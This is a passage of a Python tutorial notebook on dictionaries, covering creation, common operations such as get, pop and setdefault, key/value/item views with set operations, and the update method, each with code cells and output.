
# Section 03 - Dictionaries

##  Creating Python Dictionaries

There are different mechanisms available to create dictionaries in Python.

#### Literals

We can use a literal to create a dictionary:


```
a = {'k1': 100, 'k2': 200}
```


```
a
```




    {'k1': 100, 'k2': 200}



Note that the order in which the items are listed in the literal is maintained when listing out the elements of the dictionary. This does not hold for Python version earlier than 3.6 (practically, version 3.5).

Another thing to note is that dictionary **keys** must be hashable objects. Associated values on the other hand can be any object.

So tuples of hashable objects are themselves hashable, but lists are not, even if they only contain hashable elements. Tuples of non-hashable elements are also not hashable.


```
hash((1, 2, 3))
```




    2528502973977326415




```
hash([1, 2, 3])
```


    ---------------------------------------------------------------------------

    TypeError                                 Traceback (most recent call last)

    <ipython-input-4-84d65be9aa35> in <module>
    ----> 1 hash([1, 2, 3])
    

    TypeError: unhashable type: 'list'



```
hash(([1, 2], [3, 4]))
```


    ---------------------------------------------------------------------------

    TypeError                                 Traceback (most recent call last)

    <ipython-input-5-f578847ae11e> in <module>
    ----> 1 hash(([1, 2], [3, 4]))
    

    TypeError: unhashable type: 'list'


So we can create dictionaries that look like this:


```
a = {('a', 100): ['a', 'b', 'c'], 'key2': {'a': 100, 'b': 200}}
```


```
a
```




    {('a', 100): ['a', 'b', 'c'], 'key2': {'a': 100, 'b': 200}}



Interestingly, functions are hashable:


```
def my_func(a, b, c):
    print(a, b, c)
```


```
hash(my_func)
```




    284093589



Which means we can use functions as keys in dictionaries:


```
d = {my_func: [10, 20, 30]}
```

A simple application of this might be to store the argument values we want to use to call the function at a later time:


```
def fn_add(a, b):
    return a + b

def fn_inv(a):
    return 1/a

def fn_mult(a, b):
    return a * b
```


```
funcs = {fn_add: (10, 20), fn_inv: (2,), fn_mult: (2, 8)}
```

Remember that when we iterate through a dictionary we are actually iterating through the keys:


```
for f in funcs:
    print(f)
```

    <function fn_add at 0x10eeec8c8>
    <function fn_inv at 0x10eeec6a8>
    <function fn_mult at 0x10eeec620>
    

We can then call the functions this way:


```
for f in funcs:
    result = f(*funcs[f])
    print(result)
```

    30
    0.5
    16
    

We can also iterate through the items (as tuples) in a dictionary as follows:


```
for f, args in funcs.items():
    print(f, args)
```

    <function fn_add at 0x10eeec8c8> (10, 20)
    <function fn_inv at 0x10eeec6a8> (2,)
    <function fn_mult at 0x10eeec620> (2, 8)
    

So we could now call each function this way:


```
for f, args in funcs.items():
    result = f(*args)
    print(result)
```

    30
    0.5
    16
    

#### Using the class constructor

We can also use the class constructor `dict()` in different ways:

##### Keyword Arguments


```
d = dict(a=100, b=200)
```


```
d
```




    {'a': 100, 'b': 200}



The restriction here is that the key names must be valid Python identifiers, since they are being used as argument names.

We can also build a dictionary by passing it an iterable containing the keys and the values:


```
d = dict([('a', 100), ('b', 200)])
```


```
d
```




    {'a': 100, 'b': 200}



The restriction here is that the elements of the iterable must themselves be iterables with exactly two elements.


```
d = dict([('a', 100), ['b', 200]])
```


```
d
```




    {'a': 100, 'b': 200}



Of course we can also pass a dictionary as well:


```
d = {'a': 100, 'b': 200, 'c': {'d': 1, 'e': 2}}
```

Here I am using a dictionary that happens to contain a nested dictionary for the key `c`.

Let's look at the id of `d`:


```
id(d)
```




    4545038016



And let's create a dictionary:


```
new_dict = dict(d)
```


```
new_dict
```




    {'a': 100, 'b': 200, 'c': {'d': 1, 'e': 2}}



What's the id of `new_dict`?


```
id(new_dict)
```




    4545071576



As you can see, we have a new object - however, what about the nested dictionary?


```
id(d['c']), id(new_dict['c'])
```




    (4545357864, 4545357864)



As you can see they are the same - so be careful, using the `dict` constructor this way essentially creates a **shallow copy**.

We'll come back to copying dicts later.

#### Using Comprehensions

We can also create dictionaries using a dictionary comprehension.
This is very similar to list comprehensions or generator expressions.

Suppose we have two iterables, one containing some keys, and one containing some values we want to associate with each key:


```
keys = ['a', 'b', 'c']
values = (1, 2, 3)
```

We can then easily create a dictionary this way - the non-Pythonic way!


```
d = {}  # creates an empty dictionary
for k, v in zip(keys, values):
    d[k] = v
```


```
d
```




    {'a': 1, 'b': 2, 'c': 3}



But it is much simpler to use a dictionary comprehension:


```
d = {k: v for k, v in zip(keys, values)}
```


```
d
```




    {'a': 1, 'b': 2, 'c': 3}



Dictionary comprehensions support the same syntax as list comprehensions - you can have nested loops, `if` statements, etc.


```
keys = ['a', 'b', 'c', 'd']
values = (1, 2, 3, 4)

d = {k: v for k, v in zip(keys, values) if v % 2 == 0}
```


```
d
```




    {'b': 2, 'd': 4}



In the following example we are going to create a grid of 2D coordinate pairs, and calculate their distance from the origin:


```
x_coords = (-2, -1, 0, 1, 2)
y_coords = (-2, -1, 0, 1, 2)
```

If you remember list comprehensions, we would create all possible `(x,y)` pairs using nested loops (a Cartesian product):


```
grid = [(x, y) 
         for x in x_coords 
         for y in y_coords]
grid
```




    [(-2, -2),
     (-2, -1),
     (-2, 0),
     (-2, 1),
     (-2, 2),
     (-1, -2),
     (-1, -1),
     (-1, 0),
     (-1, 1),
     (-1, 2),
     (0, -2),
     (0, -1),
     (0, 0),
     (0, 1),
     (0, 2),
     (1, -2),
     (1, -1),
     (1, 0),
     (1, 1),
     (1, 2),
     (2, -2),
     (2, -1),
     (2, 0),
     (2, 1),
     (2, 2)]




```
import math
```

We can use the `math` module's `hypot` function to do calculate these distances


```
math.hypot(1, 1)
```




    1.4142135623730951



So to calculate these distances for all our points we would do this:


```
grid_extended = [(x, y, math.hypot(x, y)) for x, y in grid]
grid_extended
```




    [(-2, -2, 2.8284271247461903),
     (-2, -1, 2.23606797749979),
     (-2, 0, 2.0),
     (-2, 1, 2.23606797749979),
     (-2, 2, 2.8284271247461903),
     (-1, -2, 2.23606797749979),
     (-1, -1, 1.4142135623730951),
     (-1, 0, 1.0),
     (-1, 1, 1.4142135623730951),
     (-1, 2, 2.23606797749979),
     (0, -2, 2.0),
     (0, -1, 1.0),
     (0, 0, 0.0),
     (0, 1, 1.0),
     (0, 2, 2.0),
     (1, -2, 2.23606797749979),
     (1, -1, 1.4142135623730951),
     (1, 0, 1.0),
     (1, 1, 1.4142135623730951),
     (1, 2, 2.23606797749979),
     (2, -2, 2.8284271247461903),
     (2, -1, 2.23606797749979),
     (2, 0, 2.0),
     (2, 1, 2.23606797749979),
     (2, 2, 2.8284271247461903)]



We can now easily tweak this to make a dictionary, where the coordinate pairs are the key, and the distance the value:


```
grid_extended = {(x, y): math.hypot(x, y) for x, y in grid}
```


```
grid_extended
```




    {(-2, -2): 2.8284271247461903,
     (-2, -1): 2.23606797749979,
     (-2, 0): 2.0,
     (-2, 1): 2.23606797749979,
     (-2, 2): 2.8284271247461903,
     (-1, -2): 2.23606797749979,
     (-1, -1): 1.4142135623730951,
     (-1, 0): 1.0,
     (-1, 1): 1.4142135623730951,
     (-1, 2): 2.23606797749979,
     (0, -2): 2.0,
     (0, -1): 1.0,
     (0, 0): 0.0,
     (0, 1): 1.0,
     (0, 2): 2.0,
     (1, -2): 2.23606797749979,
     (1, -1): 1.4142135623730951,
     (1, 0): 1.0,
     (1, 1): 1.4142135623730951,
     (1, 2): 2.23606797749979,
     (2, -2): 2.8284271247461903,
     (2, -1): 2.23606797749979,
     (2, 0): 2.0,
     (2, 1): 2.23606797749979,
     (2, 2): 2.8284271247461903}



#### Using `fromkeys`

The `dict` class also provides the `fromkeys` method that we can use to create dictionaries.
This class method is used to create a dictionary from an iterable containing the keys, and a **single** value used to assign to each key.


```
counters = dict.fromkeys(['a', 'b', 'c'], 0)
```


```
counters
```




    {'a': 0, 'b': 0, 'c': 0}



If we do not specify a value, then `None` is used:


```
d = dict.fromkeys('abc')
```


```
d
```




    {'a': None, 'b': None, 'c': None}



Notice how I used the fact that strings are iterables to specify the three single character keys for this dictionary!

`fromkeys` method will insert the keys in the order in which they are retrieved from the iterable:


```
d = dict.fromkeys('python')
```


```
d
```




    {'p': None, 'y': None, 't': None, 'h': None, 'o': None, 'n': None}



Uh-Oh!! Looks like the ordering didn't work!!
I've pointed this out a few times already, but Jupyter (this notebook), uses a printing mechanism that will order the keys alphabetically.

To see the real order of the keys in the dict we should use the print statement ourselves:


```
print(d)
```

    {'p': None, 'y': None, 't': None, 'h': None, 'o': None, 'n': None}
    

Much better! :-)

##  Common Operations

You should already be aware of many of these, so I'll only spend time on some of the more interesting ones.

Dictionaries support the `len` function - this simply returns the number of key/value pairs in the dictionary:


```
d = dict(zip('abc', range(1, 4)))
d
```




    {'a': 1, 'b': 2, 'c': 3}




```
len(d)
```




    3



We can retrieve an element from a dictionary using `[]` notation, providing the key. If the key is not present we will get a `KeyError` exception:


```
d['a']
```




    1




```
d['python']
```


    ---------------------------------------------------------------------------

    KeyError                                  Traceback (most recent call last)

    <ipython-input-4-b3a08e39b305> in <module>
    ----> 1 d['python']
    

    KeyError: 'python'


Sometimes though, we do not want an exception to happen, and we want to provide some 'default' value instead.
We could certainly catch the exception, but that's clunky. Instead we can use the `get` instance method:


```
d.get('a')
```




    1




```
result = d.get('python')
print(result)
```

    None
    

As you can see, we do not get an exception, we simply get `None` back. We can actually specify the default to use when the key is not found:


```
d.get('python', 0)
```




    0



This can be quite useful when we are using a dictionary to keep track of some count for different keys that are not know ahead of time (if they were, we could use `fromkeys` to initialize a dictionary with all the keys  and initial values of `0`.

Let's see a simple example of this:

##### Example

Here we have a string where we want to count the number of each character that appears in the string.
Since we know the alphabet is a-z, we could create a dictionary with these initial keys - but maybe the string contains characters outside of that, maybe punctuation marks, emojis, etc. So it's not really feasible to take that approach.


```
text = 'Sed ut perspiciatis, unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam eaque ipsa, quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt, explicabo. Nemo enim ipsam voluptatem, quia voluptas sit, aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos, qui ratione voluptatem sequi nesciunt, neque porro quisquam est, qui dolorem ipsum, quia dolor sit amet consectetur adipisci[ng] velit, sed quia non-numquam [do] eius modi tempora inci[di]dunt, ut labore et dolore magnam aliquam quaerat voluptatem. Ut enim ad minima veniam, quis nostrum exercitationem ullam corporis suscipit laboriosam, nisi ut aliquid ex ea commodi consequatur? Quis autem vel eum iure reprehenderit, qui in ea voluptate velit esse, quam nihil molestiae consequatur, vel illum, qui dolorem eum fugiat, quo voluptas nulla pariatur?'
counts = dict()
for c in text:
    counts[c] = counts.get(c, 0) + 1
print(counts)
```

    {'S': 1, 'e': 77, 'd': 22, ' ': 128, 'u': 69, 't': 65, 'p': 22, 'r': 38, 's': 43, 'i': 76, 'c': 19, 'a': 70, ',': 20, 'n': 37, 'o': 51, 'm': 43, 'v': 15, 'l': 33, 'q': 26, 'b': 5, 'h': 3, 'x': 3, '.': 2, 'N': 1, 'f': 2, 'g': 5, '[': 3, ']': 3, '-': 1, 'U': 1, '?': 2, 'Q': 1}
    

We can refine this a bit - first we'll ignore spaces, then we'll want to consider lowercase and uppercase characters as the same:


```
counts = dict()
for c in text:
    key = c.lower().strip()
    if key:
        counts[key] = counts.get(key, 0) + 1
print(counts)
```

    {'s': 44, 'e': 77, 'd': 22, 'u': 70, 't': 65, 'p': 22, 'r': 38, 'i': 76, 'c': 19, 'a': 70, ',': 20, 'n': 38, 'o': 51, 'm': 43, 'v': 15, 'l': 33, 'q': 27, 'b': 5, 'h': 3, 'x': 3, '.': 2, 'f': 2, 'g': 5, '[': 3, ']': 3, '-': 1, '?': 2}
    

#### Membership Tests

We can use the `in` and `not in` operators to test the presence of a **key** in a dictionary:


```
d = dict(a=1, b=2, c=3)
```


```
'a' in d
```




    True




```
'z' in d
```




    False




```
'z' not in d
```




    True



#### Removing elements from a dictionary

We can use the `del` operator to remove a key from a dictionary:


```
d = dict.fromkeys('abcd', 0)
```


```
d
```




    {'a': 0, 'b': 0, 'c': 0, 'd': 0}



We can remove a key this way:


```
del d['a']
```


```
d
```




    {'b': 0, 'c': 0, 'd': 0}



If the key is not present, we will get a `KeyError` exception:


```
del d['z']
```


    ---------------------------------------------------------------------------

    KeyError                                  Traceback (most recent call last)

    <ipython-input-18-052f324ccc70> in <module>
    ----> 1 del d['z']
    

    KeyError: 'z'


Just like setting elements, we may not want an exception to be raised - in which case we can use the `pop` and `popitem` instance methods instead.

Let's start with the `pop` method first.
We simply specify the **key** we want to remove from the dictionary. The `pop` method will not only remove the item (if the key is present), but also return the associated value:


```
d
```




    {'b': 0, 'c': 0, 'd': 0}




```
result = d.pop('b')
result
```




    0




```
d
```




    {'c': 0, 'd': 0}




```
result = d.pop('z')
```


    ---------------------------------------------------------------------------

    KeyError                                  Traceback (most recent call last)

    <ipython-input-22-7d836d1b6a83> in <module>
    ----> 1 result = d.pop('z')
    

    KeyError: 'z'


So we still get a `KeyError` exception!
To do this, we need to specify a **default** value to use if the key is not found:


```
result = d.pop('z', 'Not found!')
result
```




    'Not found!'



The `popitem` method is similar, but slightly different. It does not take a key, it simply removes an element from the dictionary unless the dictionary is empty, in which case it will result in a `KeyError`. The method returns a **tuple** containing the key and the value that was just removed.

Let's take a look at a simple example:


```
d = {'a': 10, 'b': 20, 'c': 30}
```


```
d.popitem()
```




    ('c', 30)




```
d.popitem()
```




    ('b', 20)




```
d.popitem()
```




    ('a', 10)




```
d.popitem()
```


    ---------------------------------------------------------------------------

    KeyError                                  Traceback (most recent call last)

    <ipython-input-28-83c64cff336b> in <module>
    ----> 1 d.popitem()
    

    KeyError: 'popitem(): dictionary is empty'


So one important thing to note here is the order in which the elements of the dictionary are popped - they are popped in reverse order from how they were inserted. So as you can see above, `c` was inserted last, and hence was popped first.
So this is called a **LIFO** (last in, first out) order, and since dicts are ordered in Python 3.6+, this LIFO order when popping is also guaranteed.

**Versions prior to 3.6 do not guarantee this order.**

#### Inserting keys with a default

Sometimes we may want to insert an element in a dictionary with a default value, but only if the element is not already present:


```
d = {'a': 1, 'b': 2, 'c': 3}
```

We could do it this way:


```
if 'z' not in d:
    d['z'] = 0
```


```
d
```




    {'a': 1, 'b': 2, 'c': 3, 'z': 0}



We could write a simple utility function to do this for us, and return the value of the item as well while we're at it:


```
def insert_if_not_present(d, key, value):
    if key not in d:
        d[key] = value
        return value
    else:
        return d[key]
```


```
print(d)
```

    {'a': 1, 'b': 2, 'c': 3, 'z': 0}
    


```
result = insert_if_not_present(d, 'a', 0)
print(result, d)
```

    1 {'a': 1, 'b': 2, 'c': 3, 'z': 0}
    


```
result = insert_if_not_present(d, 'y', 10)
print(result, d)
```

    10 {'a': 1, 'b': 2, 'c': 3, 'z': 0, 'y': 10}
    

But instead, we can simply use the `setdefault` instance method, which will do the work we just did:


```
d = {'a': 1, 'b': 2, 'c': 3}
result = d.setdefault('a', 0)
print(result)
print(d)
```

    1
    {'a': 1, 'b': 2, 'c': 3}
    


```
result = d.setdefault('z', 100)
print(result)
print(d)
```

    100
    {'a': 1, 'b': 2, 'c': 3, 'z': 100}
    

This is quite a useful method.
Let's take a look at that example we did earlier that looked at how many times each character occurred in a string:


```
text = 'Sed ut perspiciatis, unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam eaque ipsa, quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt, explicabo. Nemo enim ipsam voluptatem, quia voluptas sit, aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos, qui ratione voluptatem sequi nesciunt, neque porro quisquam est, qui dolorem ipsum, quia dolor sit amet consectetur adipisci[ng] velit, sed quia non-numquam [do] eius modi tempora inci[di]dunt, ut labore et dolore magnam aliquam quaerat voluptatem. Ut enim ad minima veniam, quis nostrum exercitationem ullam corporis suscipit laboriosam, nisi ut aliquid ex ea commodi consequatur? Quis autem vel eum iure reprehenderit, qui in ea voluptate velit esse, quam nihil molestiae consequatur, vel illum, qui dolorem eum fugiat, quo voluptas nulla pariatur?'
counts = dict()
for c in text:
    key = c.lower().strip()
    if key:
        counts[key] = counts.get(key, 0) + 1
print(counts)
```

    {'s': 44, 'e': 77, 'd': 22, 'u': 70, 't': 65, 'p': 22, 'r': 38, 'i': 76, 'c': 19, 'a': 70, ',': 20, 'n': 38, 'o': 51, 'm': 43, 'v': 15, 'l': 33, 'q': 27, 'b': 5, 'h': 3, 'x': 3, '.': 2, 'f': 2, 'g': 5, '[': 3, ']': 3, '-': 1, '?': 2}
    

Suppose now that we just want a dictionary to track the uppercase, lowercase, and other characters in the string (i.e. kind of grouping the data by uppercase, lowercase, other) - again ignoring spaces:


```
import string
print(string.ascii_lowercase)
print(string.ascii_uppercase)
```

    abcdefghijklmnopqrstuvwxyz
    ABCDEFGHIJKLMNOPQRSTUVWXYZ
    

Here's one approach we might take:


```
categories = {}
for c in text:
    if c != ' ':
        if c in string.ascii_lowercase:
            key = 'lower'
        elif c in string.ascii_uppercase:
            key = 'upper'
        else:
            key = 'other'
        if key not in categories:
            categories[key] = set()  # set we'll insert the value into
        
        categories[key].add(c)
for cat in categories:
    print(f'{cat}:', ''.join(categories[cat]))
```

    upper: UQNS
    lower: dlsumxihcfbapnroeqtvg
    other: [?-].,
    

We can simplify this a bit using `setdefault`:


```
categories = {}
for c in text:
    if c != ' ':
        if c in string.ascii_lowercase:
            key = 'lower'
        elif c in string.ascii_uppercase:
            key = 'upper'
        else:
            key = 'other'
        categories.setdefault(key, set()).add(c)

for cat in categories:
    print(f'{cat}:', ''.join(categories[cat]))
```

    upper: UQNS
    lower: dlsumxihcfbapnroeqtvg
    other: [?-].,
    

Just to clean things up a but more, let's create a small utility function that will return the category key:


```
def cat_key(c):
    if c == ' ':
        return None
    elif c in string.ascii_lowercase:
        return 'lower'
    elif c in string.ascii_uppercase:
        return 'upper'
    else:
        return 'other'
```


```
categories = {}
for c in text:
    key = cat_key(c)
    if key:
        categories.setdefault(key, set()).add(c)

for cat in categories:
    print(f'{cat}:', ''.join(categories[cat]))
```

    upper: UQNS
    lower: dlsumxihcfbapnroeqtvg
    other: [?-].,
    

If you are not a fan of using `if...elif...` in the `cat_key` function we could do it this way as well:


```
def cat_key(c):
    categories = {' ': None,
                 string.ascii_lowercase: 'lower',
                 string.ascii_uppercase: 'upper'}
    for key in categories:
        if c in key:
            return categories[key]
    else:
        return 'other'
```


```
cat_key('a'), cat_key('A'), cat_key('!'), cat_key(' ')
```




    ('lower', 'upper', 'other', None)



This approach is easier to extend without having a lot of `elif` statements, but for a few categories, I find the first implementation much clearer to read and understand.


```
categories = {}
for c in text:
    key = cat_key(c)
    if key:
        categories.setdefault(key, set()).add(c)

for cat in categories:
    print(f'{cat}:', ''.join(categories[cat]))
```

    upper: UQNS
    lower: dlsumxihcfbapnroeqtvg
    other: [?-].,
    

We could also do it this way, creating a categories dictionary that has all the individual characters we are interested in:


```
from itertools import chain

def cat_key(c):
    cat_1 = {' ': None}
    cat_2 = dict.fromkeys(string.ascii_lowercase, 'lower')
    cat_3 = dict.fromkeys(string.ascii_uppercase, 'upper')
    categories = dict(chain(cat_1.items(), cat_2.items(), cat_3.items()))
    # categories = {**cat_1, **cat_2, **cat_3} - I'll explain this later
    return categories.get(c, 'other')
```


```
cat_key('a'), cat_key('A'), cat_key('!'), cat_key(' ')
```




    ('lower', 'upper', 'other', None)




```
categories = {}
for c in text:
    key = cat_key(c)
    if key:
        categories.setdefault(key, set()).add(c)
        
for cat in categories:
    print(f'{cat}:', ''.join(categories[cat]))
```

    upper: UQNS
    lower: dlsumxihcfbapnroeqtvg
    other: [?-].,
    

#### Clearing All Items

If we want to remove all the keys in a dictionary, we can use the `clear` method:


```
d = {'a': 1, 'b': 2, 'c': 3}
```


```
d
```




    {'a': 1, 'b': 2, 'c': 3}




```
d.clear()
```


```
d
```




    {}



As you can see, Python dictionaries are extremely flexible and have all sorts of useful methods we can use to manipulate them.

##  Views: keys, values and items

We'll come back to these dictionary views in a lot more detail once we have studied sets, because they are very related.

For now, let's just briefly look at the basics of these views.

Views are special objects that support set behavior and also support iteration over the keys, values, and key/value pairs (items) in a dictionary.

A quick look at some common set operations:


```
s1 = {1, 2, 3}
s2 = {2, 3, 4}
```

Unions:


```
s1 | s2
```




    {1, 2, 3, 4}



Intersections:


```
s1 & s2
```




    {2, 3}



Differences:


```
s1 - s2
```




    {1}




```
s2 - s1
```




    {4}



Now let's look at these views:


```
d1 = {'a': 1, 'b': 2, 'c': 3}
d2 = {'c': 30, 'd': 4, 'e': 5}
```

We can iterate over the keys of a dictionary using the dictionary's iterator directly, or via the `keys` view:


```
for key in d1:
    print(key)
```

    a
    b
    c
    


```
for key in d1.keys():
    print(key)
```

    a
    b
    c
    

We can iterate over just the values of the dictionary:


```
for value in d1.values():
    print(value)
```

    1
    2
    3
    

and over the items, as tuples, of the dictionary:


```
for item in d1.items():
    print(item)
```

    ('a', 1)
    ('b', 2)
    ('c', 3)
    

We can also unpack the tuples directly while iterating:


```
for k, v in d1.items():
    print(k, v)
```

    a 1
    b 2
    c 3
    

These views are iterables, not just iterators:


```
keys = d1.keys()
```


```
list(keys)
```




    ['a', 'b', 'c']




```
list(keys)
```




    ['a', 'b', 'c']



As you can see we can iterate over and over on the same view.

The order in which keys, value and items are returned during iteration match - as long as the dictionary has not changed in-between.

So for example, the following expression will always evaluate to true:


```
list(d1.items()) == list(zip(d1.keys(), d1.values()))
```




    True



Views are dynamic, in the sense that if something changes in the dictionary, the views immediately reflect the change - that's because the views do not themselves contain data, they simply have extra bits of functionality that uses the dictionary as the source of truth.


```
keys
```




    dict_keys(['a', 'b', 'c'])




```
d1['z'] = 10
```


```
keys
```




    dict_keys(['a', 'b', 'c', 'z'])




```
del d1['z']
```


```
keys
```




    dict_keys(['a', 'b', 'c'])



Now, the interesting thing is that some of these views also exhibit set behaviors.


```
print(d1)
print(d2)
```

    {'a': 1, 'b': 2, 'c': 3}
    {'c': 30, 'd': 4, 'e': 5}
    

We can find all the keys that are in both `d1` and `d2`:


```
print(type(d1.keys()), d1.keys())
print(type(d2.keys()), d2.keys())
union = d1.keys() | d2.keys()
print(type(union), union)
```

    <class 'dict_keys'> dict_keys(['a', 'b', 'c'])
    <class 'dict_keys'> dict_keys(['c', 'd', 'e'])
    <class 'set'> {'a', 'b', 'e', 'c', 'd'}
    

One thing to really watch out for here: once we start performing set like operations, the result is a true `set`, and although ordering in the views is guaranteed, ordering in the resulting sets are **not** as you can see from the example above!

We can also find the keys that are in both `d1` and `d2`:


```
d1.keys() & d2.keys()
```




    {'c'}



We can also find the keys that are only in `d1` but not in `d2`:


```
d1.keys() - d2.keys()
```




    {'a', 'b'}



The same works with items as well:


```
d1.items() | d2.items()
```




    {('a', 1), ('b', 2), ('c', 3), ('c', 30), ('d', 4), ('e', 5)}



You'll notice that `('c', 3)` and `('c', 30)` are distinct elements, hence they show up as individual elements in the result.

Values on the other hand are more problematic. Keys in a dictionary must be hashable, and set elements must also be hashable, so it's not a problem creating a set of keys for example. But what about values? These need noe be unique or hashable. And items for that matter? The first element of the tuple must be hashable since it's the key, but the value?


```
d3 = {'a': [1, 2], 'b': [3, 4]}
d4 = {'b': [30, 40], 'c': [5, 6]}
```


```
d3.values()
```




    dict_values([[1, 2], [3, 4]])



Can we perform some set operations on the values?


```
d3.values() | d4.values()
```


    ---------------------------------------------------------------------------

    TypeError                                 Traceback (most recent call last)

    <ipython-input-28-9366ac502855> in <module>
    ----> 1 d3.values() | d4.values()
    

    TypeError: unsupported operand type(s) for |: 'dict_values' and 'dict_values'


The answer is no, the `values` view does not behave like a set - it can't because there is no guarantee the values are unique and hashable.

What's interesting though is that `items` does have unique values (since the keys are unique), but the values may or may not be hashable as in the example of `d3` and `d4`:


```
print(d3)
print(d4)
```

    {'a': [1, 2], 'b': [3, 4]}
    {'b': [30, 40], 'c': [5, 6]}
    


```
d3.items() | d4.items()
```


    ---------------------------------------------------------------------------

    TypeError                                 Traceback (most recent call last)

    <ipython-input-30-1b688db1e1d4> in <module>
    ----> 1 d3.items() | d4.items()
    

    TypeError: unhashable type: 'list'


As you can see, `items`, in this case also does not exhibit set like capabilities.

But that's not always the case. Let's go back to our first example:


```
print(d1)
print(d2)
```

    {'a': 1, 'b': 2, 'c': 3}
    {'c': 30, 'd': 4, 'e': 5}
    


```
d1.items() | d2.items()
```




    {('a', 1), ('b', 2), ('c', 3), ('c', 30), ('d', 4), ('e', 5)}



Aha! In this case `items` **does** behave like a set - that's because the values are all hashable!

That's all I'm going to cover for now on dictionary views, we'll come back to them in greater detail in the context of sets.

##### Example 1

Let's take a look at a practical example of using these views for something other than plain iteration:

Let's say we have two dictionaries, and we want to create a new dictionary that contains all the items whose keys are in both dictionaries.
We want the value in the new dictionary to be a tuple containing all the values from both dictionaries:


```
d1 = {'a': 1, 'b': 2, 'c': 3}
d2 = {'b': 2, 'c': 30, 'd': 4}
```


```
k1 = d1.keys()
k2 = d2.keys()
k1 & k2
```




    {'b', 'c'}



So we have now identified the common keys, all that's left to do is build a dictionary from those keys and the corresponding values.

We can use a simple loop to do this:


```
new_dict = {}
for key in d1.keys() & d2.keys():
    new_dict[key] = (d1[key], d2[key])
print(new_dict)
```

    {'b': (2, 2), 'c': (3, 30)}
    

But, a dictionary comprehension would be a better approach here:


```
new_dict = {key: (d1[key], d2[key]) for key in d1.keys() & d2.keys()}
print(new_dict)
```

    {'b': (2, 2), 'c': (3, 30)}
    

##### Example 2

Let's tweak this a bit and generate a new dictionary, again containing just the common keys, but whose value is either the common value, or if the underlying dictionaries have different values for the same key, choose the values from the second dictionary, discarding the values from the first.

The approach is going to be almost identical to the previous example.

Let's just see which value we want to use for both cases (same values, different values):
* same values: pick value from `d1` or `d2` (since values are the same it does not matter)
* different values: pick value from `d2`

As you can see, in both cases we just need to pick the value in `d2`.


```
d1 = {'a': 1, 'b': 2, 'c': 3}
d2 = {'b': 2, 'c': 30, 'd': 4}
new_dict = {key: d2[key] for key in d1.keys() & d2.keys()}
print(new_dict)
```

    {'b': 2, 'c': 30}
    

##### Example 3

For this example, suppose we have two dictionaries, and we want to identify items whose keys are **not** common to both dictionaries:


```
d1 = {'a': 1, 'b': 2, 'c': 3, 'd': 4}
d2 = {'a': 10, 'b': 20, 'c': 30, 'e': 5}
```

As you can see from visual inspection, we want to end up with a dictionary that looks like this:


```
{'d': 4, 'e': 5}
```




    {'d': 4, 'e': 5}



First let's consider how we would identify the non-common keys.

Start with the union of the keys - this identifies all unique keys in both dictionaries:


```
union = d1.keys() | d2.keys()
print(union)
```

    {'a', 'b', 'e', 'c', 'd'}
    

Next, we look at the intersection of the keys - this identifies all keys common to both dictionaries:


```
intersection = d1.keys() & d2.keys()
print(intersection)
```

    {'a', 'b', 'c'}
    

Finally, we can remove the keys in the intersection from the kesy in the union:


```
keys = union - intersection
print(keys)
```

    {'e', 'd'}
    

As you can see we now have the keys we are interested in.
All that's left is to pick up the values as well.

(We'll cover this later in the section on sets, but there's a quicker way to get this, using something called a symmetric difference.)

First note that given a key, it will be present in either `d1` or `d2`, but not both.
So to get the value for the key we need to look at both dictionaries and pick the value from whichever dictionary has the key:


```
value = d1.get('e')
print(value)
```

    None
    


```
value = d2.get('e')
print(value)
```

    5
    

So, we can combine these two expressions with an or to get the non-`None` value (one of them always will be `None`):


```
d1.get('d') or d2.get('d')
```




    4




```
d1.get('e') or d2.get('e')
```




    5



So now we need to use this to gather up the values for our keys and create a result dictionary:

We could do it using a standard loop:


```
d1 = {'a': 1, 'b': 2, 'c': 3, 'd': 4}
d2 = {'a': 10, 'b': 20, 'c': 30, 'e': 5}
union = d1.keys() | d2.keys()
intersection = d1.keys() & d2.keys()
keys = union - intersection

result = {}
for key in keys:
    result[key] = d1.get(key) or d2.get(key)
print(result)
```

    {'e': 5, 'd': 4}
    

Or, better yet, we could use a dictionary comprehension:


```
result = {key: d1.get(key) or d2.get(key) for key in keys}
print(result)
```

    {'e': 5, 'd': 4}
    

Just for completeness, and again, we'll cover this in detail later, we can use the symmetric difference operator for sets (`^`) which does in one operation the same thing we did with the union, intersection, and difference operators, making this even more concise:


```
d1 = {'a': 1, 'b': 2, 'c': 3, 'd': 4}
d2 = {'a': 10, 'b': 20, 'c': 30, 'e': 5}
result = {key: d1.get(key) or d2.get(key)
         for key in d1.keys() ^ d2.keys()}
print(result)
```

    {'e': 5, 'd': 4}
    

##  Updating, Merging and Copying

Updating an existing key's value in a dictionary is straightforward:


```
d = {'a': 1, 'b': 2, 'c': 3}
```


```
d['b'] = 200
```


```
d
```




    {'a': 1, 'b': 200, 'c': 3}



#### The `update` method

Sometimes however, we want to update all the items in one dictionary based on items in another dictionary.

For that we can use the `update` method.

The `update` method has three forms:
1. it can take another dictionary
2. it can take an iterable of iterables of length 2 (key, value)
3. if can take keyword arguments

You'll notice that the arguments we can use with `update` is very similar to the type of arguments we can use with the `dict()` function when we create dictionaries.

Let's look briefly at each of those forms:


```
d1 = {'a': 1, 'b': 2}
d2 = {'c': 3, 'd': 4}
```


```
d1.update(d2)
print(d1)
```

    {'a': 1, 'b': 2, 'c': 3, 'd': 4}
    

Note how the key order is maintained and based on the order in which the dictionaries were create/updated.


```
d1 = {'a': 1, 'b': 2}
```


```
d1.update(b=20, c=30)
print(d1)
```

    {'a': 1, 'b': 20, 'c': 30}
    

Again notice how the key order reflects the order in which the parameters were specified when calling the `update` method.


```
d1 = {'a': 1, 'b': 2}
```


```
d1.update([('c', 2), ('d', 3)])
```


```
d1
```




    {'a': 1, 'b': 2, 'c': 2, 'd': 3}



Of course we can use more complex iterables. For example we could use a generator expression:


```
d = {'a': 1, 'b': 2}
d.update((k, ord(k)) for k in 'python')
print(d)
```

    {'a': 1, 'b': 2, 'p': 112, 'y': 121, 't': 116, 'h': 104, 'o': 111, 'n': 110}
    

So far we have updated dictionaries with other dictionaries or iterables that do not contain the same keys. Sometimes that does happen - in that case, the corresponding key in the dictionary being updated has it's associated value replaced by the new value:


```
d1 = {'a': 1, 'b': 2, 'c': 3}
